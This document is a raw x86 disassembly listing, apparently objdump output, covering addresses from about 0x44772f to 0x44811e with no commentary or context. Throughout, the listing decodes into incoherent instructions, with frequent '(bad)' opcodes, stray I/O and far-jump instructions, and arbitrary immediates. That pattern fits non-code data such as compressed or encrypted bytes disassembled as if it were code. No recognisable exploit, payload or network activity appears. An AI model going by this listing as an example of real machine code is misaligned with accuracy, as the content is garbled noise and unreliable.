  44772f:	shl    DWORD PTR [ebx+0x36],0x5c
  447733:	dec    ecx
  447734:	or     al,0xc7
  447736:	imul   esp,ecx,0xfd644d5f
  44773c:	mov    esi,0x45
	...
  447759:	add    BYTE PTR [eax],al
  44775b:	add    BYTE PTR [esp+eiz*2],al
  44775e:	inc    ebp
  44775f:	inc    eax
  447760:	je     0x44771e
  447762:	inc    esp
  447763:	in     al,0x5f
  447765:	or     eax,0x4430e0b8
  44776a:	stc    
  44776b:	sub    al,0x66
  44776d:	(bad)  
  44776e:	(bad)  
  44776f:	(bad)  
  447770:	fnstsw WORD PTR [edi]
  447772:	aad    0xb8
  447774:	adc    al,0x77
  447776:	cmp    DWORD PTR [eax],eax
  447778:	adc    esi,edi
  44777a:	stc    
  44777b:	jmp    DWORD PTR [edx+edi*8+0x3c]
  44777f:	in     al,0x34
  447781:	add    al,0x0
  447783:	add    BYTE PTR [edi+0xd458438],bl
  447789:	xor    edi,DWORD PTR [ebx+eax*2+0x51]
  44778d:	(bad)  
  44778e:	shl    bl,0xfe
  447791:	es std 
  447793:	call   DWORD PTR [esp+eiz*8+0x5ac08563]
  44779a:	jbe    0x4477aa
  44779c:	fisub  WORD PTR [esi+0x7c]
  44779f:	inc    ebx
  4477a0:	add    eax,0x94f3bfb0
  4477a5:	imul   ebp,DWORD PTR ds:0x84d34885,0xffffffff
  4477ac:	repnz es std 
  4477af:	int3   
  4477b0:	in     eax,dx
  4477b1:	scas   eax,DWORD PTR es:[edi]
  4477b2:	scas   eax,DWORD PTR es:[edi]
  4477b3:	out    0x96,eax
  4477b5:	mov    esi,0x9fda4877
  4477ba:	(bad)  
  4477bb:	rol    DWORD PTR [ebx+eiz*2+0x8725],cl
	...
  4477de:	pop    eax
  4477df:	repz jge 0x4477dc
  4477e2:	or     al,0x94
  4477e4:	cli    
  4477e5:	cmp    ah,BYTE PTR [ecx+0x26]
  4477e8:	std    
  4477e9:	jmp    DWORD PTR [esi+0xffa7e1c]
  4477ef:	mov    esp,0x253d3af5
  4477f4:	std    
  4477f5:	dec    DWORD PTR [edx]
  4477f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4477f8:	push   eax
  4477f9:	call   DWORD PTR [edx+0x29537626]
  4477ff:	mov    al,0xa8
  447801:	out    dx,eax
  447802:	jbe    0x447824
  447804:	jb     0x44784d
  447806:	or     eax,0x86d3c09e
  44780b:	repz dec edi
  44780d:	test   eax,ebx
  44780f:	jbe    0x447888
  447811:	jae    0x44787c
  447813:	lods   al,BYTE PTR ds:[esi]
  447814:	ds es dec edi
  447817:	sahf   
  447818:	mov    eax,0xfcb2020e
  44781d:	test   BYTE PTR [ebp-0x1],dl
  447820:	fnsave ds:0xbfa105c6
  447826:	or     al,BYTE PTR [eax]
  447828:	or     DWORD PTR [ebx-0x32],edi
  44782b:	or     eax,0x19a71a7e
  447830:	outs   dx,BYTE PTR ds:[esi]
  447831:	mov    edi,0x4320832
  447836:	nop
  447837:	retf   0x186
  44783a:	dec    ebp
  44783b:	test   ebx,ebx
  44783d:	sti    
  44783e:	xchg   edx,eax
  44783f:	(bad)
	...
  44785e:	add    BYTE PTR [eax],al
  447860:	push   esi
  447861:	push   esp
  447862:	sar    DWORD PTR [eax+0x11],0x8
  447866:	leave  
  447867:	jp     0x4478b7
  447869:	adc    bh,BYTE PTR [esi]
  44786b:	cli    
  44786c:	cmp    DWORD PTR [ecx+0x29],ecx
  44786f:	mov    edi,0x7ac0a012
  447874:	inc    esi
  447875:	adc    bl,BYTE PTR [esi+0x39]
  447878:	sub    BYTE PTR [edx+0x5e],cl
  44787b:	cmp    eax,0x8a1eb590
  447880:	ret    0xe737
  447883:	add    ecx,eax
  447885:	and    bl,BYTE PTR [esi-0x49]
  447888:	mov    esi,0x5678fa53
  44788d:	sub    BYTE PTR [eax-0x41],dh
  447890:	retf   0xb385
  447893:	outs   dx,BYTE PTR ds:[esi]
  447894:	or     eax,0x9003e700
  447899:	das    
  44789a:	pop    esp
  44789b:	clc    
  44789c:	ret    
  44789d:	mov    esp,DWORD PTR [esp+esi*8-0x69]
  4478a1:	fwait
  4478a2:	out    0x3,eax
  4478a4:	or     eax,0x2835fe00
  4478a9:	inc    edx
  4478aa:	pusha  
  4478ab:	or     bl,dh
  4478ad:	aaa    
  4478ae:	je     0x447868
  4478b0:	gs js  0x44789b
  4478b3:	add    ecx,DWORD PTR ds:0xee9a0000
  4478b9:	jl     0x447906
  4478bb:	mov    cl,0xcb
  4478bd:	jbe    0x447933
  4478bf:	hlt    
  4478c0:	mov    ebx,0xe9245b
	...
  4478e1:	add    BYTE PTR [esi],cl
  4478e3:	add    BYTE PTR [eax],al
  4478e5:	mov    eax,0x14bf82d6
  4478ea:	xlat   BYTE PTR ds:[ebx]
  4478eb:	add    al,0xfd
  4478ee:	sbb    cl,BYTE PTR [edx+0x46ed7e50]
  4478f4:	std    
  4478f5:	cwde   
  4478f6:	xchg   edi,eax
  4478f7:	shl    bh,cl
  4478f9:	or     BYTE PTR [ecx],0x40
  4478fc:	inc    ebx
  4478fd:	popa   
  4478fe:	push   cs
  4478ff:	add    BYTE PTR [eax],al
  447901:	jmp    0xec343b93
  447906:	xchg   BYTE PTR [eax],bh
  447908:	stc    
  447909:	jmp    0xad431b1c
  44790e:	stos   DWORD PTR es:[edi],eax
  44790f:	bound  esi,QWORD PTR [ebx-0x29]
  447912:	add    eax,0x52e6ebdb
  447917:	cmp    eax,0x7d0ee900
  44791c:	dec    ebx
  44791d:	sbb    DWORD PTR [ecx+0x7b720f6f],edi
  447923:	or     cl,BYTE PTR [ecx]
  447925:	pop    esi
  447926:	stos   BYTE PTR es:[edi],al
  447927:	(bad)  
  447928:	xor    al,0xac
  44792a:	push   edx
  44792b:	or     DWORD PTR [edx-0x6c6b623],eax
  447931:	jb     0x4478fe
  447933:	dec    edx
  447934:	sbb    eax,0x737f467c
  447939:	and    eax,0xf6cfb315
  44793e:	mov    dh,BYTE PTR ds:0x7ccedefa
  447944:	push   ebx
  447945:	fld    QWORD PTR [eax]
	...
  447963:	add    BYTE PTR [ebp+eax*2-0x35641e8d],al
  44796a:	sti    
  44796b:	add    ch,bl
  44796d:	push   eax
  44796e:	in     eax,dx
  44796f:	mov    esi,DWORD PTR [ebp-0x7a]
  447972:	cmp    eax,0xc150efe8
  447977:	lea    esi,[eax]
  447979:	mov    al,BYTE PTR [ebx-0x7f3ba035]
  44797f:	inc    ebp
  447980:	pushf  
  447981:	mov    bl,0xf8
  447983:	jmp    DWORD PTR [edx+eax*1]
  447986:	sti    
  447987:	shl    BYTE PTR [edi-0x25],1
  44798a:	xor    dl,BYTE PTR [ebp+0x78]
  44798d:	outs   dx,BYTE PTR ds:[esi]
  44798e:	push   ss
  44798f:	lea    esp,[eax]
  447991:	push   edi
  447992:	popf   
  447993:	nop
  447994:	sub    edi,DWORD PTR [ecx-0x784cd4cb]
  44799a:	sar    BYTE PTR [esi-0x8],0x3b
  44799e:	cmp    al,BYTE PTR [ebx-0x400501ce]
  4479a4:	pop    ds
  4479a5:	push   edi
  4479a6:	in     eax,0x72
  4479a8:	dec    edi
  4479a9:	test   DWORD PTR [ebp-0x3c],ebp
  4479ac:	pop    edi
  4479ad:	push   edi
  4479ae:	ror    DWORD PTR [ebx+0x1b709b1],1
  4479b4:	in     al,0x1
  4479b6:	add    bl,dl
  4479b8:	push   ebx
  4479b9:	std    
  4479ba:	into   
  4479bb:	mov    DWORD PTR [ecx-0x33],ebp
  4479be:	adc    BYTE PTR [ebp+0x4c],0x7d
  4479c2:	clc    
  4479c3:	add    DWORD PTR [ecx+0xfa7909],edx
	...
  4479e5:	add    BYTE PTR [eax-0x2],ah
  4479e8:	(bad)  
  4479e9:	(bad)  
  4479ea:	inc    DWORD PTR [ebx+edi*2]
  4479ed:	clc    
  4479ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4479ef:	js     0x4479f2
  4479f1:	sbb    DWORD PTR [esi+0x74fffb51],0xc28b636e
  4479fb:	xchg   BYTE PTR [ebp+0x14],ch
  4479fe:	inc    DWORD PTR [esi]
  447a00:	mov    BYTE PTR [ecx*1-0x68f57649],cl
  447a07:	fdivr  QWORD PTR [edi]
  447a09:	mov    cl,cl
  447a0b:	xlat   BYTE PTR ds:[ebx]
  447a0c:	add    eax,DWORD PTR [ebp-0x18304ded]
  447a12:	es pop edi
  447a14:	inc    esp
  447a15:	test   DWORD PTR [edi],0xabcfd7a0
  447a1b:	scas   eax,DWORD PTR es:[edi]
  447a1c:	enter  0xf8f,0x90
  447a20:	mov    ds:0x8a8e32f9,eax
  447a25:	inc    ebx
  447a26:	and    eax,0x4743c9c
  447a2b:	push   ecx
  447a2c:	loopne 0x447a21
  447a2e:	ficomp WORD PTR [eax+0x58b886a7]
  447a34:	mov    dl,BYTE PTR [ebx-0xb]
  447a37:	pop    esp
  447a38:	enter  0x4d0f,0xaf
  447a3c:	fisttp WORD PTR [esi]
  447a3e:	xchg   BYTE PTR [ebx+0xd],ah
  447a41:	xchg   DWORD PTR [ecx],eax
  447a43:	test   eax,0xa1c54389
  447a48:	xlat   BYTE PTR ds:[ebx]
  447a49:	sti    
	...
  447a66:	add    BYTE PTR [eax],al
  447a68:	nop
  447a69:	sub    cl,BYTE PTR [eax-0x2d8f300]
  447a6f:	test   BYTE PTR [eax+0x53],cl
  447a72:	add    al,0x8
  447a74:	xchg   esi,eax
  447a75:	pop    ebx
  447a76:	adc    eax,0xcb06255
  447a7b:	sub    eax,0xe38a74cd
  447a80:	push   eax
  447a81:	jmp    0xfffd:0x276558d9
  447a88:	or     eax,0x38e38a5d
  447a8d:	jmp    0x7f28:0xa238f989
  447a94:	jns    0x447aac
  447a96:	add    eax,DWORD PTR [eax]
  447a98:	or     eax,0xbac88800
  447a9d:	shl    dh,0xf4
  447aa0:	dec    edi
  447aa1:	xchg   BYTE PTR [eax+eax*2],ch
  447aa4:	xchg   edx,eax
  447aa5:	jp     0x447a6e
  447aa7:	aas    
  447aa8:	fs xor al,0x70
  447aab:	(bad)  
  447aac:	cmp    DWORD PTR [edx],esi
  447aae:	mov    edx,0x8f8a8a41
  447ab3:	aas    
  447ab4:	inc    esp
  447ab5:	xor    al,0x60
  447ab7:	lahf   
  447ab8:	pop    ecx
  447ab9:	xor    ah,BYTE PTR [edx-0x48956dbf]
  447abf:	aas    
  447ac0:	xor    al,0x34
  447ac2:	pusha  
  447ac3:	jg     0x447b1e
  447ac5:	xor    cl,BYTE PTR [edx+0x5c83af41]
  447acb:	cmp    al,0x0
	...
  447ae9:	add    BYTE PTR [esi],dl
  447aeb:	xor    al,0x7a
  447aed:	stos   BYTE PTR es:[edi],al
  447aee:	xchg   BYTE PTR [edx+0x34043f83],al
  447af4:	add    DWORD PTR [eax+0x416448a6],edx
  447afa:	hlt    
  447afb:	call   0x4152:0x35c9876a
  447b02:	outs   dx,DWORD PTR ds:[esi]
  447b03:	test   BYTE PTR [esp+eax*2-0x55bdcc1a],al
  447b0a:	xchg   BYTE PTR [ebp+0x7b],ah
  447b0d:	aas    
  447b0e:	aam    0x33
  447b10:	push   ebx
  447b11:	xchg   ecx,eax
  447b12:	mov    ?,WORD PTR [eax]
  447b14:	sub    al,0x41
  447b16:	les    eax,FWORD PTR [edi+0x7d9207ac]
  447b1c:	(bad)  
  447b1e:	mov    ah,0x33
  447b20:	fs (bad) 
  447b22:	push   cs
  447b23:	cmp    esp,DWORD PTR [esp+esi*8-0x59]
  447b27:	xor    eax,DWORD PTR [edx]
  447b29:	add    ecx,DWORD PTR ds:0x8e8ae701
  447b2f:	sub    al,0x0
  447b31:	hlt    
  447b32:	int    0x38
  447b34:	test   DWORD PTR [ecx+0x34dfa842],ebp
  447b3a:	push   ecx
  447b3b:	xor    ecx,DWORD PTR [eax-0x6c8d59c]
  447b41:	(bad)  
  447b42:	int    0xe
  447b44:	cld    
  447b45:	clc    
  447b46:	dec    esi
  447b47:	xor    eax,DWORD PTR [esi-0x351b32cc]
  447b4d:	rol    DWORD PTR [eax],1
	...
  447b6b:	add    ch,bh
  447b6d:	(bad)  
  447b6e:	(bad)  
  447b6f:	call   0xaec9f04b
  447b74:	pop    ebx
  447b75:	jl     0x447b63
  447b77:	inc    esp
  447b78:	out    0xc8,al
  447b7a:	clc    
  447b7b:	sahf   
  447b7c:	int    0x43
  447b7e:	int3   
  447b7f:	rcr    BYTE PTR [ebx],cl
  447b81:	mov    esp,0xaf092abf
  447b86:	cld    
  447b87:	stos   BYTE PTR es:[edi],al
  447b88:	push   cs
  447b89:	add    bh,ah
  447b8b:	mov    ds:0x62000004,eax
  447b90:	dec    ebp
  447b91:	into   
  447b92:	test   BYTE PTR [ebx+0x1],bh
  447b95:	jb     0x447c0b
  447b97:	(bad)  
  447b98:	xchg   ebx,eax
  447b99:	sub    eax,0x7bd9fa74
  447b9e:	stc    
  447b9f:	arpl   WORD PTR [edi],ax
  447ba1:	jp     0x447bb3
  447ba3:	popa   
  447ba4:	push   es
  447ba5:	mov    BYTE PTR [edi-0x7d0e3128],0x37
  447bac:	fwait
  447bad:	and    DWORD PTR [ebp-0x69],edx
  447bb0:	push   ecx
  447bb1:	inc    esp
  447bb2:	int3   
  447bb3:	sbb    eax,0x35cc4452
  447bb8:	dec    edx
  447bb9:	inc    esp
  447bba:	int3   
  447bbb:	sub    eax,0x62cc4442
  447bc0:	dec    ebp
  447bc1:	iret   
  447bc2:	test   ch,bh
  447bc4:	mov    esp,0x9c00537b
  447bc9:	push   edi
  447bca:	test   al,bh
  447bcc:	iret   
  447bcd:	hlt    
  447bce:	ins    DWORD PTR es:[edi],dx
  447bcf:	outs   dx,BYTE PTR ds:[esi]
	...
  447bec:	add    BYTE PTR [eax],al
  447bee:	out    dx,eax
  447bef:	inc    ecx
  447bf0:	add    eax,0x4b04688d
  447bf5:	mov    DWORD PTR [ecx],ebp
  447bf7:	ror    BYTE PTR [ebp-0x15],0x67
  447bfb:	pop    DWORD PTR [ecx+0x0]
  447bfe:	out    dx,eax
  447bff:	js     0x447bf6
  447c01:	mov    ebx,DWORD PTR [esi+0xa77f036]
  447c07:	xchg   ecx,eax
  447c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447c09:	and    al,0x64
  447c0b:	(bad)  
  447c0c:	(bad)  
  447c0d:	jmp    FWORD PTR [edi+0x1a530d50]
  447c13:	dec    ebp
  447c14:	clc    
  447c15:	push   ebp
  447c16:	xor    al,0x7d
  447c18:	les    ecx,FWORD PTR [ecx+ebp*4]
  447c1b:	mov    ebx,0xd1af0275
  447c20:	cli    
  447c21:	je     0x447c63
  447c23:	xor    eax,0x868b76f0
  447c28:	inc    ebp
  447c29:	or     al,0x9f
  447c2b:	pop    eax
  447c2c:	add    DWORD PTR [ebx+0x3bbf8585],ecx
  447c32:	xchg   ebx,eax
  447c33:	js     0x447c4d
  447c35:	test   DWORD PTR ds:0x3f8b1478,edi
  447c3b:	and    eax,0x146e90c8
  447c40:	adc    BYTE PTR [esi*8-0x5dfee37b],0x85
  447c48:	adc    BYTE PTR [eax+0x69],al
  447c4b:	jmp    0x8b05:0x4f2ff06c
	...
  447c6e:	add    BYTE PTR [eax],al
  447c70:	cdq    
  447c71:	add    eax,0xf7aff923
  447c76:	outs   dx,BYTE PTR ds:[esi]
  447c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447c78:	jb     0x447cd0
  447c7a:	pop    eax
  447c7b:	mov    ecx,DWORD PTR ds:0xd1bcdf04
  447c81:	adc    edx,DWORD PTR [eax-0x34]
  447c84:	leave  
  447c85:	jmp    0x447cd6
  447c87:	int3   
  447c88:	shl    ebx,0x4f
  447c8b:	int3   
  447c8c:	pop    ecx
  447c8d:	sahf   
  447c8e:	cmp    BYTE PTR [ebx-0x6a],dl
  447c91:	xor    eax,DWORD PTR [esp+ebp*8-0x2d7f3]
  447c98:	fisubr WORD PTR [ebp-0x623df821]
  447c9e:	mov    edi,0xb86e880b
  447ca3:	daa    
  447ca4:	nop
  447ca5:	cmp    dh,BYTE PTR [ecx-0x3ab3addd]
  447cab:	adc    ebp,ecx
  447cad:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  447caf:	push   DWORD PTR [esi+eiz*1+0x26a4ffa7]
  447cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447cb7:	dec    DWORD PTR [ebx+0x27]
  447cba:	adc    eax,DWORD PTR [eax]
  447cbc:	or     eax,0x23eb2527
  447cc1:	cmp    BYTE PTR [edx],0x7d
  447cc4:	push   ecx
  447cc5:	push   ebx
  447cc6:	ficom  DWORD PTR [esi+eax*4+0x7c]
  447cca:	loopne 0x447c88
  447ccc:	arpl   WORD PTR [esi-0x5777f049],bx
  447cd2:	mov    dl,0x1
	...
  447cf0:	add    BYTE PTR [eax],al
  447cf2:	mov    ds,WORD PTR [ebx]
  447cf4:	adc    DWORD PTR [eax],eax
  447cf6:	js     0x447cf4
  447cf8:	cmp    BYTE PTR [ebx],dl
  447cfa:	push   ebp
  447cfb:	xor    DWORD PTR [ebp-0x58d88b01],edi
  447d01:	jmp    DWORD PTR [edi+eiz*1-0x59]
  447d05:	jmp    DWORD PTR [edi+eiz*1+0x42]
  447d09:	add    BYTE PTR [ebx],ah
  447d0b:	daa    
  447d0c:	std    
  447d0d:	push   DWORD PTR [ebp-0x4506c553]
  447d13:	jmp    DWORD PTR [ebp+0x47]
  447d16:	sbb    edx,edx
  447d18:	mov    ecx,0xb41a91da
  447d1d:	inc    edx
  447d1e:	and    BYTE PTR [ecx],dh
  447d20:	in     eax,0xb1
  447d22:	sahf   
  447d23:	shl    cl,0x6e
  447d26:	xchg   edi,eax
  447d27:	cld    
  447d28:	std    
  447d29:	inc    ebp
  447d2a:	into   
  447d2b:	sub    esp,edi
  447d2d:	add    ecx,DWORD PTR ds:0x76e06000
  447d33:	xchg   BYTE PTR [esp+edi*1-0x7a],ah
  447d37:	xchg   esp,eax
  447d38:	out    0x3,eax
  447d3a:	or     eax,0x28455e00
  447d3f:	cmp    eax,0x295c5216
  447d44:	daa    
  447d45:	adc    DWORD PTR [ebp+0x7],0xba901b32
  447d4c:	into   
  447d4d:	mov    dh,dl
  447d4f:	or     edx,DWORD PTR [edi]
  447d51:	rcr    esp,cl
  447d53:	int3   
  447d54:	ins    DWORD PTR es:[edi],dx
  447d55:	inc    ebp
	...
  447d72:	add    BYTE PTR [eax],al
  447d74:	and    eax,0x243d993e
  447d79:	jl     0x447d26
  447d7b:	adc    al,0x2a
  447d7d:	xchg   ecx,eax
  447d7e:	call   0x1cc98a86
  447d83:	sbb    al,0x42
  447d85:	daa    
  447d86:	jmp    0xfd89:0xa603cf6c
  447d8d:	(bad)  
  447d8e:	adc    eax,0xfad5f5d2
  447d93:	or     cl,0xfc
  447d96:	arpl   WORD PTR [edi+eiz*2-0x4],ax
  447d9a:	pop    ebp
  447d9b:	xlat   BYTE PTR ds:[ebx]
  447d9c:	adc    bh,BYTE PTR [ebx+0x19]
  447d9f:	mov    DWORD PTR [eax-0x2bc234e8],ebx
  447da5:	das    
  447da6:	outs   dx,BYTE PTR ds:[esi]
  447da7:	(bad)  
  447da8:	and    dl,bh
  447daa:	call   FWORD PTR [ecx-0x2aacd722]
  447db0:	lea    eax,[esp+ecx*1+0x6c]
  447db4:	dec    ecx
  447db5:	stos   BYTE PTR es:[edi],al
  447db6:	or     esi,DWORD PTR [edx-0x3e]
  447db9:	inc    DWORD PTR [esi+eiz*1-0x5e17926c]
  447dc0:	fsubr  DWORD PTR [eax]
  447dc2:	stc    
  447dc3:	jb     0x447d87
  447dc5:	pop    ss
  447dc6:	push   ecx
  447dc7:	xchg   edi,eax
  447dc8:	pop    edi
  447dc9:	sub    BYTE PTR [ebx-0x23],dl
  447dcc:	lea    eax,[esp+ecx*1+0x64]
  447dd0:	shr    DWORD PTR [ecx-0xa48df5],1
  447dd6:	test   BYTE PTR [esi+0x0],ch
	...
  447df4:	add    BYTE PTR [eax],al
  447df6:	xchg   ebp,eax
  447df7:	inc    edx
  447df8:	call   0xf96da102
  447dfd:	adc    bl,BYTE PTR [edx+esi*4]
  447e00:	adc    al,0xea
  447e02:	xor    edi,edi
  447e04:	xor    al,0x9f
  447e06:	jge    0x447e1b
  447e08:	test   DWORD PTR [ecx+eiz*1],ebx
  447e0b:	ror    BYTE PTR [ebx+ebx*1-0x8],cl
  447e0f:	rcl    BYTE PTR [ebx],cl
  447e11:	push   0xffffffca
  447e13:	sti    
  447e14:	sub    BYTE PTR [ecx-0x65cad998],0x59
  447e1b:	or     bh,ch
  447e1d:	sub    eax,DWORD PTR [ecx]
  447e1f:	cmc    
  447e20:	pop    edx
  447e21:	sbb    DWORD PTR [ecx+0x12],0xd2292485
  447e28:	dec    esp
  447e29:	sbb    DWORD PTR [eax-0x2d],eax
  447e2c:	adc    ebp,DWORD PTR [edx+0x52]
  447e2f:	cld    
  447e30:	sub    BYTE PTR [ecx],0xb0
  447e33:	es in  eax,0xea
  447e36:	fwait
  447e37:	(bad)  
  447e38:	inc    DWORD PTR [ecx]
  447e3a:	mov    ds:0xa04f34fe,al
  447e3f:	inc    BYTE PTR [eax+eax*1+0x574e0a99]
  447e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447e47:	jmp    0x447e95
  447e49:	adc    al,0x37
  447e4b:	(bad)  
  447e4c:	or     eax,DWORD PTR [ebp+0x3be26be4]
  447e52:	dec    ebx
  447e53:	je     0x447e87
  447e55:	mov    esp,DWORD PTR [ecx+0x12]
  447e58:	add    edi,0x0
	...
  447e77:	add    BYTE PTR [eax-0x30347be1],al
  447e7d:	mov    ebx,0xf2718941
  447e82:	push   es
  447e83:	mov    dh,0x60
  447e85:	add    DWORD PTR [eax-0x520490ab],ecx
  447e8b:	adc    ah,ch
  447e8d:	push   ss
  447e8e:	stc    
  447e8f:	push   cs
  447e90:	xchg   edx,eax
  447e91:	push   eax
  447e92:	add    al,0x88
  447e94:	fs jge 0x447ee4
  447e97:	lock xor al,0x81
  447e9a:	retf   0x4575
  447e9d:	lock psraw mm6,QWORD PTR cs:[edx-0x8]
  447ea3:	dec    DWORD PTR [ebx+0x4e9eb7e]
  447ea9:	jmp    0x447ea1
  447eab:	jmp    DWORD PTR [edi]
  447ead:	or     DWORD PTR [bp+di],edi
  447eb0:	xchg   ebx,eax
  447eb1:	jbe    0x447ed1
  447eb3:	jmp    0x447eec
  447eb5:	ja     0x447ef8
  447eb7:	add    BYTE PTR [edi+0x67],cl
  447eba:	or     DWORD PTR [ebx],edi
  447ebc:	mov    dh,BYTE PTR [ecx+0x12]
  447ebf:	mov    esp,ecx
  447ec1:	or     ecx,DWORD PTR [esi+0x57]
  447ec4:	and    al,0xe9
  447ec6:	dec    esp
  447ec7:	adc    al,0x77
  447ec9:	ror    BYTE PTR [ebx],0x85
  447ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447ecd:	jo     0x447eb1
  447ecf:	cmp    edx,DWORD PTR [ebx+0x76]
  447ed2:	sbb    bl,ch
  447ed4:	idiv   DWORD PTR [eax+0x41]
  447ed7:	add    BYTE PTR ds:0xfb702,cl
	...
  447ef9:	add    BYTE PTR [esi-0x2acace9c],al
  447eff:	ins    DWORD PTR es:[edi],dx
  447f00:	adc    al,BYTE PTR [ebp+0x50cf1f58]
  447f06:	pop    esp
  447f07:	test   dh,0x13
  447f0a:	mov    fs,ebx
  447f0c:	pop    es
  447f0d:	or     ebp,0xffffff8b
  447f10:	pop    ds
  447f11:	test   DWORD PTR [eax+0xb],edx
  447f14:	mov    DWORD PTR [ebx-0x5b],edx
  447f17:	mov    ds:0x42a28549,al
  447f1c:	dec    edx
  447f1d:	and    eax,0x7c34429d
  447f22:	ss inc edx
  447f24:	ds ins DWORD PTR es:[edi],dx
  447f26:	sbb    BYTE PTR [edx-0x5c7b0c3a],ah
  447f2c:	xchg   BYTE PTR [eax+0x72],bh
  447f2f:	es xchg DWORD PTR ss:[ecx+0x62f8fc9c],ebp
  447f37:	push   esi
  447f38:	les    eax,FWORD PTR [esi-0x2a05ad38]
  447f3e:	fdivp  st(7),st
  447f40:	mov    BYTE PTR [ebx+0x45],bh
  447f43:	mov    dl,0xaf
  447f45:	sete   BYTE PTR [eax+edi*1]
  447f49:	out    0xa4,eax
  447f4b:	pop    esp
  447f4c:	ss stc 
  447f4e:	test   BYTE PTR [eax-0x4e],0x12
  447f52:	xchg   esi,eax
  447f53:	fsubr  QWORD PTR [edi]
  447f55:	xchg   DWORD PTR [ecx+0x1af8b4a4],eax
  447f5b:	jle    0x447ee9
  447f5d:	xchg   esp,eax
	...
  447f7a:	add    BYTE PTR [eax],al
  447f7c:	adc    BYTE PTR [edi],0x36
  447f7f:	stc    
  447f80:	or     bl,al
  447f82:	mov    cl,BYTE PTR [ebx-0x7]
  447f85:	jno    0x447fc5
  447f87:	ins    DWORD PTR es:[edi],dx
  447f88:	or     esp,DWORD PTR [edx-0x790429]
  447f8e:	fist   DWORD PTR [ebx]
  447f90:	xchg   edx,eax
  447f91:	stos   BYTE PTR es:[edi],al
  447f92:	pop    esi
  447f93:	sub    al,0x27
  447f95:	cs push edx
  447f97:	cmp    dl,BYTE PTR [eax+0x4e8ef6b2]
  447f9d:	xor    al,0x66
  447f9f:	sub    ecx,edx
  447fa1:	ja     0x447f47
  447fa3:	das    
  447fa4:	adc    al,0x78
  447fa6:	jmp    0x8e8f:0x5e2cb439
  447fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447fae:	and    DWORD PTR [edx],edi
  447fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447fb1:	js     0x448016
  447fb3:	or     BYTE PTR ds:0x923a122d,0xd2
  447fba:	or     cl,BYTE PTR [esi+ecx*2-0x6fa291d8]
  447fc1:	daa    
  447fc2:	adc    BYTE PTR [edx],cl
  447fc4:	xchg   DWORD PTR [edx+esi*8],ebp
  447fc7:	inc    esi
  447fc8:	dec    ecx
  447fc9:	cmp    edx,DWORD PTR [esi+0x3b78ddd1]
  447fcf:	loopne 0x447feb
  447fd1:	jns    0x447ff6
  447fd3:	loopne 0x447fd3
  447fd5:	js     0x447ffa
  447fd7:	loopne 0x447fdb
  447fd9:	shl    DWORD PTR [esp+edx*8],cl
  447fdc:	ret    
  447fdd:	into   
  447fde:	dec    esi
  447fdf:	pusha  
	...
  447ffc:	add    BYTE PTR [eax],al
  447ffe:	mov    dh,0xc0
  448000:	out    0x9f,al
  448002:	inc    ebp
  448003:	repnz out 0x3,al
  448006:	or     eax,0x72c08800
  44800b:	shl    dh,0xf4
  44800e:	dec    esi
  44800f:	jbe    0x448034
  448011:	loopne 0x44801d
  448013:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448014:	pop    edi
  448015:	fistp  WORD PTR [edx]
  448017:	sub    al,0xe7
  448019:	add    ecx,DWORD PTR [eax-0x6e0c353d]
  44801f:	enter  0x8cee,0x51
  448023:	in     al,0xff
  448025:	les    eax,FWORD PTR [ecx]
  448027:	adc    eax,DWORD PTR [ebp-0x652f507]
  44802d:	addr16 popf 
  44802f:	hlt    
  448030:	test   BYTE PTR [ebp+0x537cefc2],dh
  448036:	pop    ss
  448037:	mov    ah,0x3
  448039:	adc    bl,BYTE PTR [ebx]
  44803b:	scas   al,BYTE PTR es:[edi]
  44803c:	sub    DWORD PTR [ebp+edi*4-0x4f],esi
  448040:	mov    bl,BYTE PTR [ebp-0x1d7aefc7]
  448046:	xchg   DWORD PTR [eax-0x8f95f5],edi
  44804c:	call   FWORD PTR [ebx-0x180167ae]
  448052:	push   cs
  448053:	add    BYTE PTR [ebp-0x59e7f956],al
  448059:	in     eax,0xe
  44805b:	add    BYTE PTR [edi+0xee8],dh
  448061:	jb     0x448063
	...
  44807f:	add    BYTE PTR [eax+0x3],cl
  448082:	call   0x448dbc
  448087:	add    bh,cl
  448089:	mov    ds:0xeec88,eax
  44808e:	add    cl,ch
  448090:	mov    DWORD PTR [eax+ebx*1+0x36],eax
  448094:	aaa    
  448095:	aam    0xbc
  448097:	bound  ecx,QWORD PTR [edx-0x21]
  44809a:	add    edi,DWORD PTR [esi-0x16fe00b1]
  4480a0:	push   cs
  4480a1:	add    BYTE PTR [eax+0xee8],bh
  4480a7:	xor    eax,0xcd448438
  4480ac:	push   ss
  4480ad:	test   DWORD PTR [eax-0xf],ecx
  4480b0:	sbb    DWORD PTR [ebx-0x18],eax
  4480b3:	xchg   ebp,eax
  4480b4:	fldcw  WORD PTR [eax]
  4480b6:	stc    
  4480b7:	xor    al,0x80
  4480b9:	cwde   
  4480ba:	pop    ss
  4480bb:	add    BYTE PTR [ebx+0x4ff056e],dl
  4480c1:	maskmovq mm6,(bad)
  4480c2:	div    DWORD PTR [eax-0x28]
  4480c5:	(bad)  
  4480c6:	xor    eax,0x7ae863ff
  4480cb:	(bad)  
  4480cc:	loopne 0x44811f
  4480ce:	test   BYTE PTR [eax+ecx*1-0x4],al
  4480d2:	adc    BYTE PTR [eax+ecx*1+0x14],0x81
  4480d7:	add    bh,BYTE PTR [ebx+eax*1+0x0]
  4480db:	add    BYTE PTR [ebx+eax*8+0x4a708b4c],dh
  4480e2:	add    DWORD PTR [ebx+0x0],ecx
	...
  448100:	add    BYTE PTR [eax],al
  448102:	or     eax,0xe31c68e9
  448107:	ins    DWORD PTR es:[edi],dx
  448108:	adc    edi,edi
  44810a:	test   DWORD PTR [esi],edx
  44810c:	loope  0x448123
  44810e:	add    ebp,eax
  448110:	test   BYTE PTR [ebx-0x3daafd18],0xa8
  448117:	dec    BYTE PTR [esi+edx*2-0x55]
  44811b:	push   ebx
  44811c:	test   dl,ch
  44811e:	(bad)  
